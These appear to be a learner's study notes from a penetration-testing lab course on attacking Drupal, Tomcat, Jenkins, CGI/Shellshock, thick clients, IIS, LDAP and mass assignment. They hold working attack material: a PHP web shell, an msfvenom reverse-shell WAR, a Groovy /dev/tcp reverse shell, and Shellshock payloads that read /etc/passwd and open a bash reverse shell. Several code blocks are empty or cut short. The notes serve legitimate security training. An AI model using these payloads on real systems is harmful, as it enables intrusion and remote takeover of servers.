## PHP Filter

In older Drupal versions, especially before Drupal 8, an **administrator** could enable the **PHP Filter** module. PHP Filter allows PHP code added to Drupal content to run. So, we need **admin access or enough permissions** to enable and use the module. The module can be found under: `Administration → Modules`. For example:

```text
http://drupal-qa.inlanefreight.local/#overlay=admin/modules
```

After enabling PHP Filter, when creating or editing content, a PHP code text format can become available. We can then create a page containing PHP code such as:

```php
<?php
system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']);
?>
```

If the page is stored as `/node/3`, the command can be executed with:

```bash
curl -s "http://drupal-qa.inlanefreight.local/node/3?dcfdd5e021a869fcc6dfaef8bf31377e=id"
```

A successful result may contain:

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

This confirms that PHP code is being executed by the Drupal web server.

From Drupal 8 onwards, the **PHP Filter** module is not installed by default. If the lab or assessment requires it, the module may need to be installed manually. Because this changes the Drupal installation, this should only be done with authorization. Download the module:

```bash
wget https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz
```

Then install it through the Drupal administration interface:

```text
Administration → Reports → Available updates
```

or through the appropriate module installation page, depending on the Drupal version and available permissions. After uploading, you can again create a basic page and include your php script.

---

## Uploading a Backdoored Module

**If you already have admin access and PHP Filter is available and usable, you generally don't need the backdoored module technique.** They are **alternative ways to get PHP execution**, depending on what is available.

If administrator access allows modules to be installed, another method is to create a modified Drupal module containing a PHP web shell. First, download an existing Drupal module:

```bash

```

```bash
mv shell.php .htaccess captcha
```


**Drupalgeddon** affects Drupal 7.0 through 7.31 and is caused by a SQL injection vulnerability. One important feature of this vulnerability is that exploitation can be performed without normal authentication. A commonly used exploit can be run with:


# Section 9,10 - Apache Tomcat

## Tomcat — Discovery & Enumeration

**Apache Tomcat** is a Java web server used to run Java applications such as **Servlets and JSP**. During a pentest, Tomcat is interesting because exposed instances may have weak/default credentials, exposed management pages, or vulnerable applications.

### 1. Identify Tomcat

Tomcat often reveals itself through the **HTTP Server header** or its default error pages. Try an invalid page:

```bash
curl -i http://app-dev.inlanefreight.local:8080/invalid
```

Also check the default `/docs` page:

```bash
curl -s http://app-dev.inlanefreight.local:8080/docs/ | grep Tomcat
```

Useful default paths:

```text
/docs
/examples
/manager
/host-manager
```

### 2. Important Tomcat Structure

```text
bin/        → startup/runtime scripts
conf/       → configuration
lib/        → Java libraries
logs/       → logs
webapps/    → web applications / webroot
work/       → runtime/cache files
```

Important files:

```text
conf/tomcat-users.xml → users + manager roles
webapps/<app>/WEB-INF/web.xml → application routes/servlets
webapps/<app>/WEB-INF/classes/ → compiled Java classes
webapps/<app>/WEB-INF/lib/ → application JAR files
```

`WEB-INF/web.xml` is especially useful because it can reveal **URL routes and the Java classes handling them**. `tomcat-users.xml` can contain users and roles for the management interfaces.

### 3. Find Management Pages

Use Gobuster:

```bash
gobuster dir -u http://web01.inlanefreight.local:8180/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt
```

### 5. If `/manager` Is Accessible

First try common/default credentials:

```text
tomcat:tomcat
admin:admin
```

If valid **manager permissions** are available, the Tomcat Manager can potentially be abused to deploy a **WAR (Web Application Archive)** containing a JSP web shell, which can lead to code execution.

---

## Attacking Tomcat

Once Tomcat is identified, the main things to check are **`/manager`**, **`/host-manager`**, weak credentials, WAR deployment, and vulnerable Tomcat versions.

### 1. Brute-Force Tomcat Manager

Use Metasploit's Tomcat Manager login scanner:

```text
use auxiliary/scanner/http/tomcat_mgr_login
set VHOST web01.inlanefreight.local
set RPORT 8180
set STOP_ON_SUCCESS true
set RHOSTS 10.129.201.58
show options
run
```

`STOP_ON_SUCCESS true` stops the scanner once valid credentials are found. You can also use Burp Suite or a Python script. If troubleshooting the Metasploit scanner, we can either try the [b33lz3bub-1/Tomcat-Manager-Bruteforce: This script will bruteforce the credential of tomcat manager or host-manager](https://github.com/b33lz3bub-1/Tomcat-Manager-Bruteforce)  or  send its traffic through Burp, first, fire up Burp Suite:

```text
set PROXIES HTTP:127.0.0.1:8080
run
```

Tomcat Manager uses **HTTP Basic Authentication**, so the credentials appear Base64-encoded in the `Authorization` header. For example:

```bash
echo YWRtaW46dmFncmFudA== | base64 -d
```

Output:

```text
admin:vagrant
```

### 2. Tomcat Manager → WAR Upload

If valid credentials have the **`manager-gui`** role, access:

```text
http://web01.inlanefreight.local:8180/manager/html
```

The Manager allows `.war` files to be deployed as web applications. A WAR can contain JSP code, so deploying a JSP web shell can lead to **RCE**. Example:

```bash
wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp
zip -r backup.war cmd.jsp
```

Upload `backup.war` through **Manager → WAR file to deploy → Deploy**.  Tomcat creates an application such as:

```text
/backup
```

The JSP shell is then:

```text
/backup/cmd.jsp
```

Test it:

```bash
curl 'http://web01.inlanefreight.local:8180/backup/cmd.jsp?cmd=id'
```

### 3. Generate a Reverse-Shell WAR

Instead of a command web shell, `msfvenom` can create a WAR payload:

```bash

msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.15 LPORT=4443 -f war > backup.war
```

Start the listener:

```bash
nc -lnvp 4443
```

Deploy `backup.war` through Tomcat Manager and access `/backup` to trigger the payload. Metasploit can automate the WAR upload:

```text
exploit/multi/http/tomcat_mgr_upload
```

When we upload web shells (especially on externals), we want to prevent unauthorized access. We should take certain measures such as a randomized file name (i.e., MD5 hash), limiting access to our source IP address, and even password protecting it. We don't want an attacker to come across our web shell and leverage it to gain their own foothold.
### 4. Ghostcat — CVE-2020-1938

**Ghostcat** is an unauthenticated LFI vulnerability involving Tomcat's **AJP protocol**.  AJP commonly runs on: 8009. Check it:

```bash
nmap -sV -p 8009,8080 app-dev.inlanefreight.local
```

Example:

```text
8009/tcp open ajp13
8080/tcp open http Apache Tomcat 9.0.30
```


`WEB-INF/web.xml` is particularly interesting because it can contain **application routes and servlet information**.

# Section 11,12 - Jenkins Script Console


Jenkins is a **tool that automatically builds and deploys software**. Its special part: **it can run commands/scripts automatically**, so if Jenkins is poorly secured, it can sometimes lead to server access.

# Attacking Jenkins

If Jenkins has **weak credentials** and we can log in, the **Script Console** can be used to execute Groovy code on the Jenkins server. Jenkins often runs as a **privileged account**:

- Linux → often `jenkins` or sometimes `root`
- Windows → often `SYSTEM` or another service account

So commands executed through Jenkins run with the permissions of that account.

## Script Console

Open:

```text
http://jenkins.inlanefreight.local:8000/script
```

The Script Console accepts **Groovy** code.

### Linux — Run a Command

```groovy
def cmd = 'id'
def sout = new StringBuffer(), serr = new StringBuffer()
def proc = cmd.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println sout
```

Example:

```text
uid=0(root) gid=0(root) groups=0(root)
```

This means Jenkins is running as **root**.

### Linux — Reverse Shell

Start listener on the Attack Machine:

```bash
nc -lvnp 8443
```

Then run in Jenkins Script Console:

```groovy
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.10.14.15/8443;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

If successful:

```text
id
uid=0(root) gid=0(root) groups=0(root)
```

## Windows Jenkins

Groovy can execute Windows commands too:

```groovy
def cmd = "cmd.exe /c dir".execute();
println("${cmd.text}");
```

This runs:

```text
cmd.exe /c dir
```

The command runs with the **Jenkins service account's permissions**. This will allow webshell access and to execute commands on the underlying Windows system

Will work when the underlying OS is Windows |

# Section 19 - Attacking Tomcat CGI

**CGI (Common Gateway Interface)** is a way for a web server to run an **external program/script** when a user makes a web request. CGI is essentially middleware between web servers, external databases, and information sources. For example, a web request can call a `.bat`, `.cmd`, Python, Perl, or other script, and the script returns the result to the browser.

In **Tomcat**, the **CGI Servlet** acts as the middleman between Tomcat and these external CGI scripts. Instead of Tomcat itself handling everything, the CGI Servlet receives the request and passes information to the external script. When `enableCmdLineArguments` is enabled, Tomcat can also take values from the URL query string and pass them to the CGI script as **command-line arguments**.

**CVE-2019-0232** is a Windows Tomcat command-injection vulnerability caused by improper validation of these command-line arguments. If a vulnerable Tomcat version has `enableCmdLineArguments` enabled, an attacker may be able to inject Windows commands using characters such as `&`. Affected versions include **9.0.0.M1–9.0.17, 8.5.0–8.5.39, and 7.0.0–7.0.93**.

## 1. Find Tomcat

Scan all ports:

```bash
nmap -p- -sC -Pn 10.129.204.227 --open
```


## 2. Find CGI Scripts

CGI scripts are commonly found under:

```text
/cgi/
```

First fuzz for `.cmd` files:

```bash
ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.204.227:8080/cgi/FUZZ.cmd
```

If nothing is found, try `.bat`:

```bash
ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.204.227:8080/cgi/FUZZ.bat
```


## 3. Test Command Injection

Windows uses `&` to separate commands. Try:

```text
http://10.129.204.227:8080/cgi/welcome.bat?&dir
```

If the `dir` output appears, command injection is working. If commands such as `whoami` do not work, check the environment:

```text
http://10.129.204.227:8080/cgi/welcome.bat?&set
```

Look for:

```text

COMSPEC=C:\Windows\system32\cmd.exe

```

If `PATH` is empty, Windows may not know where `whoami.exe` is located. Use the full path:

```text

```

## 4. URL-Encode Blocked Characters

Tomcat may block characters such as `:` and `\`. URL-encode them:

```text
http://10.129.204.227:8080/cgi/welcome.bat?&c%3A%5Cwindows%5Csystem32%5Cwhoami.exe
```

# Section 20 - Attacking Common Gateway Interface (CGI) Applications - Shellshock

**CGI (Common Gateway Interface)** lets a web server run an external script such as Bash, Perl, or Python to generate a response. CGI scripts are commonly found in `/cgi-bin/`. **Shellshock (CVE-2014-6271)** is a vulnerability in old versions of **Bash** where specially crafted environment variables can cause extra commands to execute. When a CGI script passes HTTP headers such as `User-Agent` to Bash, this can lead to **RCE** as the web-server user.

## 1. Find CGI Scripts

Use Gobuster:

```bash
gobuster dir -u http://10.129.204.231/cgi-bin/ -w /usr/share/wordlists/dirb/small.txt -x cgi
```

Example: `/access.cgi`
Check the script: `curl -i http://10.129.204.231/cgi-bin/access.cgi`


## 2. Test for Shellshock

Send a malicious `User-Agent`:

```bash
curl -H 'User-Agent: () { :; }; echo ; echo ; /bin/cat /etc/passwd' bash -s :'' http://10.129.204.231/cgi-bin/access.cgi
```

If `/etc/passwd` is returned, the CGI script is likely vulnerable to Shellshock. you can either enumerate though the path or initiate a reverse shell now.

## 3. Get a Reverse Shell

Start a listener on the Attack Machine:

```bash
sudo nc -lvnp 7777
```

Then send the Shellshock payload:

```bash
curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.10.14.38/7777 0>&1' http://10.129.204.231/cgi-bin/access.cgi
```

If successful, you will get a shell.

# Section 21 - Attacking Thick Client Applications


A **thick client** is an application installed locally on our computer that performs a significant amount of processing and data storage on the client side. Unlike a **thin client**, which relies heavily on a remote server and can usually be accessed through a web browser, a thick client can sometimes work without Internet access and uses local processing power, memory, and storage. Common examples include **CRM systems, inventory tools, project-management software, media players, games, and custom enterprise applications**. Thick clients are commonly developed using **.NET, Java, C++, or similar technologies**.

Thick clients can have vulnerabilities such as **improper error handling, hardcoded credentials/secrets, DLL hijacking, buffer overflows, SQL injection, insecure storage, and weak session management**.

## Two-Tier vs Three-Tier

**Two-tier:**

```text
Thick Client → Database
```

The application communicates directly with the database.

**Three-tier:**

```text
Thick Client → Application Server → Database
```

The client communicates with an application server, usually over HTTP/HTTPS, and the application server communicates with the database. This prevents the client from directly communicating with the database.

---

# Pentesting Workflow

### 1. Information Gathering

First identify the **application architecture, programming language/framework, client/server technologies, user inputs and entry points, and how the application communicates with other systems**. Useful tools:

```text
CFF Explorer, Detect It Easy, Process Monitor (ProcMon), Strings
```

### 2. Static Analysis

Inspect the application's **source code, EXE/DLL/JAR files, configuration files, hardcoded credentials, API keys, connection strings, and other sensitive information**. Useful tools:

```text
Ghidra, IDA, OllyDbg, Radare2, dnSpy, JADX
```

### 3. Dynamic Analysis

Run the application and monitor its **files, registry activity, processes, memory, temporary files, and network connections**. Useful tools:

```text
ProcMon, x64dbg, Frida
```

### 4. Network Analysis

If the application communicates with a server, inspect the traffic for **HTTP/HTTPS requests, TCP/UDP traffic, credentials, tokens, API endpoints, SQL queries, and sensitive data**. Useful tools:

```text
Wireshark, tcpdump, TCPView, Burp Suite
```

## why we did the initial changes

The server filters `/` because the application removes or rejects that character from the user-supplied path before building the final file path; we know this because the error message shows that the `/` characters from `../../../../../../etc/passwd` are missing from the resulting path. Since `/` is blocked, instead of using a full traversal such as `../../../../etc/passwd`, we can test `..` by itself. The `..` represents the **parent directory**, so if the application normally uses `configs` and builds a path such as `/opt/fatty/files/configs/`, changing `configs` to `..` makes it request `/opt/fatty/files/..`, which resolves to the parent directory `/opt/fatty/files/`. In other words, `configs` keeps us inside the intended directory, while `..` moves one directory upward without needing the `/` character in the input.

# Section 25 - IIS Tilde Enumeration

**IIS Tilde Enumeration** abuses the Windows **8.3 short filename format** on some versions of Microsoft Internet Information Services (IIS) web servers to discover hidden files/directories when normal directory enumeration does not reveal them. When a file or folder is created on an IIS server, Windows generates a short file name in the `8.3 format`, consisting of eight characters for the file name, a period, and three characters for the extension.

First, scan the target:

```bash
nmap -p- -sV -sC --open <IP>
```

If IIS is running, use **IIS ShortName Scanner**:

```bash
java -jar iis_shortname_scanner.jar 0 5 http://<IP>/
```

It may reveal something like:

```text
TRANSF~1
```

`~1` means it is the **first matching 8.3 short-name entry** in a URL.  The short name can reveal the beginning of a hidden file or directory, such as:

```text
TRANSF~1/secret~1
TRANSF~1/somefi~1.txt
```

In **8.3 short filenames**, the number after `~` helps Windows distinguish between files with similar names in the same folder. For example, if `somefile.txt` and `somefile1.txt` are in the same directory, they may become `somefi~1.txt` and `somefi~2.txt`. So, `~1` means the first matching short-name entry, while `~2` means the second.

Once the beginning is known, generate a targeted wordlist:

```bash

egrep -r ^transf /usr/share/wordlists/* | sed 's/^[^:]*://' > /tmp/list.txt
```

Then brute-force the remaining filename characters/extensions with Gobuster:

```bash
gobuster dir -u http://<IP>/ -w /tmp/list.txt -x .aspx,.asp
```

The goal is to recover the **full filename**, for example:

```text
TRANSF~1
    ↓
transfer.aspx
```

Important: discovering a short name **does not automatically mean the full file can be accessed**. It only tells us that a matching file or directory exists; we still need to recover the actual name and test whether the resource is accessible.

# Section 26 - LDAP

**LDAP (Lightweight Directory Access Protocol)** is a protocol used to communicate with a directory that stores information such as users, groups, computers, and other network resources. LDAP commonly runs on **port 389** (LDAPS uses 636). **LDAP is a protocol, while Active Directory is a directory service that uses LDAP along with technologies such as Kerberos and DNS.** LDAP supports operations like searching, adding, modifying, and deleting directory entries. 

LDAP vs Active Directory:

```text
LDAP = Protocol
AD   = Directory Service
```

LDAP defines **how clients communicate with a directory**. Active Directory is the actual Microsoft directory service that stores and manages users, computers, groups, policies, and other objects.


LDAP is commonly used for **central authentication**, user management, directory searches, permissions, and synchronization. It is platform-independent and can be used with different directory services. **OpenLDAP** is a common open-source implementation, while **Microsoft Active Directory (AD)** is Microsoft's directory service that uses LDAP along with other technologies such as Kerberos and DNS.

**LDAP Injection** happens when user input is directly inserted into an LDAP query, allowing special characters such as `*`, `|`, `&`, `(`, and `)` to change the query's meaning. For example, `*` is a wildcard by injecting conditions that `always evaluate to true` can be used and, in a vulnerable login form, may sometimes be used to bypass authentication. A quick way to identify LDAP is `nmap -p- -sC -sV --open <IP>`, then check whether port `389` is open.

# ldapsearch

`ldapsearch` is a command-line tool used to search an LDAP directory.

Example:

```bash

ldapsearch -H ldap://ldap.example.com:389 -D "cn=admin,dc=example,dc=com" -w secret123 -b "ou=people,dc=example,dc=com" "(mail=john.doe@example.com)"
```

This means:

```text
-H → LDAP server and port
-D → account used to authenticate
-w → password
-b → starting location for the search
(mail=...) → search filter
```

The server may return:

```text
dn: uid=jdoe,ou=people,dc=example,dc=com
cn: John Doe
uid: jdoe
mail: john.doe@example.com

result: 0 Success
```

The `dn` identifies the directory entry, while the other fields are its attributes.

# Section 27 - Web Mass Assignment Vulnerabilities


**Mass Assignment** happens when an application takes many parameters from a user request and automatically assigns them to an object/database record without checking which fields the user is actually allowed to modify. If sensitive fields such as `admin`, `confirmed`, or `role` are not protected, an attacker may add them to the request and change application behavior or gain privileges.

### Simple Example

A model may only intend to allow:

```ruby
username
email
```

But the attacker sends:

```javascript
{
  "user": {
    "username": "hacker",
    "email": "hacker@example.com",
    "admin": true
  }
}
```

If `admin` is not properly protected, the application may save it even though the normal form never showed an `admin` field.

# HTB Example — Registration Bypass

The Asset Manager application requires an administrator to approve new accounts. The login code checks a database value:

```python
for i,j,k in cur.execute('select * from users where username=? and password=?',(username,password)):
    if k:
        session['user']=i
        return redirect("/home",code=302)
    else:
        return render_template('login.html',value='Account is pending for approval')
```

Here, `k` represents whether the account is confirmed. The registration code contains the vulnerability:

```python
try:

    else:
        cur.execute('insert into users values(?,?,?)',(username,password,cond))
```

The important part is:

```python

```

The application does not expect the user to control `confirmed`, but it accepts the parameter if it is included in the request.

Because `confirmed` exists and contains a value, the application sets:

```text
cond = True
```

The account is therefore inserted as already confirmed. Now log in with:

```text
Username: new
Password: test
```

Instead of seeing:

```text
Account is pending approval
```

the account is accepted immediately.

### What happened?

```text
Normal registration
→ confirmed is not supplied
→ cond = False
→ Account pending

Tampered registration
→ confirmed=test
→ cond = True
→ Account approved
→ Login succeeds
```

The important lesson is that **hidden fields are not security controls**. Even if the normal HTML form does not contain `confirmed`, an attacker can add it manually to the HTTP request.

When testing:

```text
Normal request
→ Capture with Burp
→ Look at parameters
→ Add unexpected fields
→ Test sensitive fields such as role/admin/confirmed
→ Check whether the server accepts them
```

# Section 28 - Attacking Applications Connecting to Services

Applications often connect to other services such as **databases, APIs, or internal servers**. Their connection strings may contain **usernames, passwords, server addresses, and ports**. If these credentials are stored insecurely inside an executable or DLL, they may be recovered and reused to access the connected service or other services.

## ELF Executable

If an ELF binary connects to a database, first run it and observe its behavior, such as:

```bash
./octopus_checker
```

If it shows something like:

```text
Attempting Connection
Connecting ...
SQLDriverConnect
```

the binary may contain a database connection string.  To inspect an **ELF binary**, first use `file octopus_checker` to confirm it is an ELF executable, then open it with **GDB**, which lets you run and inspect the program. **PEDA** is an extension for GDB that makes this debugging and inspection easier, especially for viewing registers, assembly, and memory.

Open it with GDB:

```bash
gdb ./octopus_checker
```

Inside GDB, use Intel assembly syntax and inspect `main`:

```text
set disassembly-flavor intel
disas main
```

Look for calls such as:

```text
SQLDriverConnect
```

We looked for that particular string because the file showed something about sql. A **breakpoint** tells GDB to **pause the program at a specific point**, so you can inspect what is happening there, such as the registers and variables.. Set a breakpoint on it:

```text
b *0x5555555551b0
run
```

When the breakpoint is reached, check the registers:

```text
RDX: 0x7fffffffda70 ("DRIVER={ODBC Driver 17 for SQL Server};SERVER=localhost, 1401;UID=username;PWD=password;")
```

The **RDX register contains the SQL connection string**, revealing information such as:

```text
Driver → ODBC Driver 17 for SQL Server
Server → localhost:1401
Username → username
Password → password
```

The recovered credentials should then be tested against the intended database and, where authorized, checked for **password reuse on other services**.

### GDB Breakpoint Problem

I initially tried `b *0x0000000000001607`, then `b *0x1607`, because the disassembly showed `0x1607 <+433>` before the `SQLDriverConnect` call. Both failed because `0x1607` is only a PIE-relative offset, not the actual runtime address. When i called for `b SQLDriverConnect@plt` and GDB/PEDA showed its actual runtime address as `0x5555555551b0`, so I used `b *0x5555555551b0` instead. However, the old breakpoint at `0x1607` was still active, so GDB continued complaining about it. I removed it with `delete 1`, checked the remaining breakpoints using `info breakpoints`, and then ran the program again. To delete **all breakpoints**, I can simply use `delete` and confirm when GDB asks. You can delete all previous breakpoints by `delete` only.

# Section 29 - Other Notable Applications

The main lesson is that the applications covered in the module are examples of a **general penetration-testing methodology**, not a complete list. In real assessments, I will encounter many unknown applications, so I should focus on **identifying the application, fingerprinting its version, checking for default/weak credentials, looking for exposed functionality, and checking known vulnerabilities**. I should also review scan results carefully instead of relying only on automated scanners, because useful findings such as exposed Git repositories, weak Tomcat credentials, SSH keys, or passwords may be hidden among a lot of scan data. The important skill is to **adapt to unfamiliar applications and follow clues that may lead to access elsewhere in the environment**.
